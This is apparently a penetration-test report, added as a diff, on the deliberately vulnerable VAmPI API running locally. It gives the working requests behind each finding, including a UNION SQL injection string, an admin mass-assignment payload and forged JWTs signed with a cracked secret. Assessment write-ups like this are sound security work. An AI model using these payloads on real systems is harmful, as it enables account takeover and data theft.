@@ -1,0 +1,80 @@
+# VAmPI (http://127.0.0.1:5002) assessment report
+
+Every finding below was reproduced against the live target. I used two of my own accounts, `evil` and `bob`, plus the seeded `name1`. I also deleted the seeded user `name2` while testing finding 12. `GET /createdb` repopulates the seed data.
+
+## 1. Unauthenticated sensitive data exposure: `/users/v1/_debug`
+- **Class:** Information disclosure (CWE-200/312).
+- **Request:** `GET /users/v1/_debug` with no auth.
+- **Response:** 200 with every user's `username`, `email`, **plaintext `password`** and `admin` flag. Examples: `admin / pass1 / admin:true`, `name1 / pass1`.
+- **Impact:** Anyone can take over any account. Passwords are stored in plaintext.
+
+## 2. Mass assignment: admin self-registration
+- **Class:** Mass assignment / privilege escalation.
+- **Request:** `POST /users/v1/register` with `{"username":"evil","password":"pw","email":"evil@x.com","admin":true}`.
+- **Response:** "Successfully registered". After logging in, `GET /me` with that token returns `{"admin": true, "username":"evil"}`.
+- **Impact:** Anyone can create an administrator. The `admin` field should be owned by the server. With admin rights, `DELETE /users/v1/name2` returned "User deleted." Non-admin `name1` got "Only Admins may delete users!".
+
+## 3. SQL injection: `GET /users/v1/{username}`
+- **Class:** SQL injection (the app uses unauthenticated string concatenation into SQLite).
+- **Request:** `GET /users/v1/x' UNION SELECT username,password,email,1,1 FROM users-- ` (URL-encoded).
+- **Response:** `{"username": "pass1", "email": "1"}`. A column from another table came back through the UNION.
+- **Impact:** Full database read without authentication. A single quote also triggers the error in finding 4: `SELECT * FROM users WHERE username = 'name1''`.
+
+## 4. Werkzeug interactive debugger and verbose errors exposed
+- **Class:** Security misconfiguration / information disclosure.
+- **Request:** `GET /users/v1/name1'`.
+- **Response:** The full Werkzeug debugger HTML page with a stack trace, the SQL statement, library file paths and the debugger `SECRET = "GAF15pKshtR00xA7uxA6"`. It reports `EVALEX = true`, so the interactive console is enabled.
+- **Impact:** Schema and source disclosure. The debugger console is a potential remote code execution route. I did not run the console, and its PIN gate may apply, so RCE is unproven.
+
+## 5. Broken access control: password change for any user (BFLA/IDOR)
+- **Class:** Broken function-level authorization.
+- **Request:** `PUT /users/v1/bob/password` with `Authorization: Bearer <name1 token>` and body `{"password":"hacked"}`.
+- **Response:** `204 NO CONTENT`. Login as `bob/hacked` then returns a token, and `bob/pw` fails.
+- **Impact:** Any authenticated user can take over any other account.
+
+## 6. Weak JWT signing secret, forgeable admin tokens
+- **Class:** Authentication and token handling (CWE-321/347).
+- **Request:** The secret `random` matched the HS256 signature of a token I obtained. I forged `{"sub":"admin","iat":…,"exp":…}` and sent `GET /me` with `Authorization: Bearer <forged>`.
+- **Response:** `{"data": {"admin": true, "email": "admin@mail.com", "username": "admin"}}`.
+- **Impact:** Anyone can impersonate any user, including admin, without a password.
+
+## 7. Broken object-level authorization: reading other users' book secrets
+- **Class:** BOLA / IDOR.
+- **Request:** `GET /books/v1/bobbook` with the `name1` token. `bob` created the book with `secret: "bobsecret"`.
+- **Response:** `{"book_title":"bobbook","owner":"bob","secret":"bobsecret"}`.
+- **Impact:** Any user can read any other user's secret. `GET /books/v1` also lists every book with its owner.
+
+## 8. User enumeration
+- **Class:** Information disclosure.
+- **Requests:** `POST /users/v1/login` with a non-existent user returns "Username does not exist". An existing user with a wrong password returns "Password is not correct for the given username."
+- **Impact:** Valid usernames can be harvested. `GET /users/v1` also lists all users and emails without auth.
+
+## 9. No rate limiting or lockout on login
+- **Class:** Authentication, absence of control.
+- **Request:** 15 consecutive bad `POST /users/v1/login` attempts for `name1`.
+- **Response:** All 15 returned HTTP 200 (failure message in the body), with no throttling, lockout or delay.
+- **Impact:** Password guessing is unrestricted. I did not brute force; this was a light demonstration only.
+
+## 10. Plaintext password storage
+- **Class:** Cryptographic failure.
+- **Evidence:** Finding 1 shows plaintext passwords. SQLi (finding 3) returned `pass1` as a stored value.
+
+## 11. Weak password policy and credential reuse
+- **Class:** Authentication.
+- **Evidence:** Registration accepted the password `pw`. The seeded admin password is `pass1`, the same as `name1`'s.
+
+## Classes tested and not proven
+- **SQL injection on `/login` and `/books/v1/{title}`:** the injection attempts failed. `admin' --` returned "Username does not exist", and the book UNION returned "Book not found!". Both appear parameterized.
+- **Email change on another user:**
+  - **Request:** `PUT /users/v1/name2/email` with the `name1` token.
+  - **Response:** the email changed on `name1` instead (`GET /users/v1/name1` showed `h@gmail.com`).
+  - **Conclusion:** the endpoint uses the token's identity, so there is no cross-user bug.
+  - **Side note:** an earlier request with a non-standard email domain was rejected.
+- **Book-ownership mass assignment:** posting `user`/`owner` fields in `POST /books/v1` was ignored. The book was owned by the caller.
+- **Token expiry and revocation:**
+  - Tokens appear to live about 60 seconds.
+  - I did not test whether old tokens still work after a password change.
+  - I did not test `alg:none`.
+- **Werkzeug debugger RCE:** not attempted, as noted in finding 4.
+- **Email-validation ReDoS:** not tested, because it would risk denial of service.
+- **Denial of service and brute force:** excluded by the rules.
